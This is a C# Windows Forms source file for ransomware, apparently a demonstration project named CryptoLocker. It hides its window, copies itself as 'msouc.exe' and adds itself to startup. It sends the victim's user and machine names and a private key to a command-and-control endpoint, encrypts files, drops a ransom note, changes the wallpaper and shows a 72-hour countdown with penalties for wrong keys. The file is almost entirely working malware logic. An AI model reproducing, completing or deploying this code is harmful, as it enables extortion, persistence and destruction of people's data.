using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CryptoLocker.WinForm
{
    public partial class Form1 : Form
    {
        private readonly string userName = Environment.UserName;
        private readonly string computerName = Environment.MachineName;
        private readonly string c2cServer = "http://localhost:55916/api/passwords";
        private readonly string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private readonly string ransomFileName = "!how_to_unlock.txt";
        private readonly string fileList = "!encrypted_files.txt";
        private readonly string[] dirsToEncrypt = new[] {"C:\\temp"};
        private readonly string wallpaperUrl = "https://sathisharthars.files.wordpress.com/2014/12/021e44da5addc20ffe5f09d9ec813f05.jpg";
        private readonly bool showForm = true;
        private DateTime ransomeEndTime;

        public Form1()
        {
            InitializeComponent();
            timer1.Interval = 1000;
            ransomeEndTime = DateTime.Now.AddHours(72);
            lblExpiryDate.Text = ransomeEndTime.ToString("f");
            btnPrev.Visible = false;
            btnNext.Visible = true;
            linkBitcoinHelp.Links.Add(new LinkLabel.Link { LinkData = "https://www.bitcoin.com/" });
            var lines = RansomNote.GetNote();
            p1.Text = lines[0];
            p2.Text = lines[1];
            p3.Text = lines[2];
            p4.Text = lines[3];
            p5.Text = lines[4];
            p6.Text = lines[5];
            p7.Text = lines[6];
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Dont show untill everything is locked
            Opacity = 0;
            this.ShowInTaskbar = false;
            this.ShowIcon = false;
            
            // Copies itself to this path
            string exePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "msouc.exe");

            // First run 
            if (string.IsNullOrEmpty(RegistryHelper.PublicKey))
            {
                RegistryHelper.EnsureKeysExists();
                SavePasswords();
                RegistryHelper.DeletePrivateKey();
                
                // Delete shadow copies
                // TODO

                try
                {
                    if(!File.Exists(exePath))
                        File.Copy(Application.ExecutablePath, exePath);
                }
                catch
                {
                    
                }
                
                RegistryHelper.AddToStartup(exePath);
                Process.Start(exePath);
                Application.Exit();
            }
            // Following runs
            else
            {
                // Wait for 2 secs before encrypting files
                Thread.Sleep(2000);
                Run();
            }
        }
        
        private void Run()
        {
            // Encrypt filez
            foreach (var dir in dirsToEncrypt)
            {
                CryptoService.EncryptFiles(dir, RegistryHelper.PublicKey);
            }

            // Drop messages on users desktop
            Task task = Task.Run(() => DropNote());

            // Either quit or show form to user
            if (showForm)
            {
                Opacity = 100;
                this.ShowInTaskbar = false;
                this.ShowIcon = false;
                timer1.Enabled = true;
            }
            else
            {
                Application.Exit();
            }
        }

        private void DropNote()
        {
            try
            {
                var lines = RansomNote.GetLogo().ToList();
                lines.AddRange(RansomNote.GetNote());
                File.WriteAllLines(Path.Combine(desktopPath, ransomFileName), lines);
                Wallpaper.Set(new Uri(wallpaperUrl), Wallpaper.Style.Stretched);
                var files = RegistryHelper.GetEncryptedFileNames().Select(x => x.Key).ToList();
                File.WriteAllLines(Path.Combine(desktopPath, fileList), files);
            }
            catch
            {
            }
        }

        // The key is sent to server using GET SSL encrypted
        public void SavePasswords()
        {
            string info = string.Join(";", computerName, userName);

            var nvc = new NameValueCollection
            {
                {"UserInfo", info},
                {"PrivateKey", RegistryHelper.PrivateKey },
                {"PublicKey", RegistryHelper.PublicKey }
            };

            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Encoding = Encoding.UTF8;
                    var responseArray = client.UploadValues(c2cServer + "/save", nvc);
                    var result = Encoding.ASCII.GetString(responseArray);
                    responseArray = null;
                    result = null;
                }
            }
            catch
            {
            }
        }

        private void btnNext_Click(object sender, EventArgs e)
        {
            btnPrev.Visible = true;
            btnPrev.Enabled = true;
            btnNext.Enabled = false;
            btnNext.Visible = true;

            panel2.Visible = true;
            panel1.Visible = false;
        }

        private void btnPrev_Click(object sender, EventArgs e)
        {
            btnPrev.Visible = false;
            btnPrev.Enabled = false;
            btnNext.Enabled = true;
            btnNext.Visible = true;

            panel2.Visible = false;
            panel1.Visible = true;
        }
        
        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            string privatekey = "";

            if (tbDecryptId.Text.Length != 15)
            {
                lblDecryptInfo.Text = "You entered a wrong key! A penalty of one hour is subtracted from your remaining time.";
                ransomeEndTime = ransomeEndTime.AddHours(-1);
                return;
            }

            try
            {
                var uri = c2cServer + "/decrypt/" + tbDecryptId.Text;
                using (var client = new WebClient())
                {
                    client.Encoding = Encoding.UTF8;
                    privatekey = client.DownloadString(uri).Trim(new char[] { '"','\\' });
                }
            }
            catch(Exception ex)
            {
            }

            if (string.IsNullOrEmpty(privatekey))
            {
                lblDecryptInfo.Text = "You entered a wrong key! A penalty of one hour is subtracted from your remaining time.";
                ransomeEndTime = ransomeEndTime.AddHours(-1);
                return;
            }

            timer1.Enabled = false;
            lblTimeLeft.Text = "";
            lblDecryptInfo.Text = "";
            label1.Text = "";
            label2.Text = "";

            foreach (var dir in dirsToEncrypt)
            {
                CryptoService.DecryptFiles(dir, privatekey);
            }
            
            RegistryHelper.DeleteAllKeys();
            Application.Exit();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (ransomeEndTime < DateTime.Now)
            {
                lblTimeLeft.Text = "Game over";
                return;
            }

            TimeSpan remaining = ransomeEndTime - DateTime.Now;
            int minutes = (int) remaining.Minutes;
            int seconds = (int) remaining.Seconds;
            lblTimeLeft.Text = $"{(int)remaining.TotalHours}:{minutes}:{seconds}";
        }

        private void btnShowFiles_Click(object sender, EventArgs e)
        {
            Process.Start("notepad.exe", Path.Combine(desktopPath, fileList));
        }

        private void linkBitcoinHelp_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start((string)e.Link.LinkData);
        }
    }
}
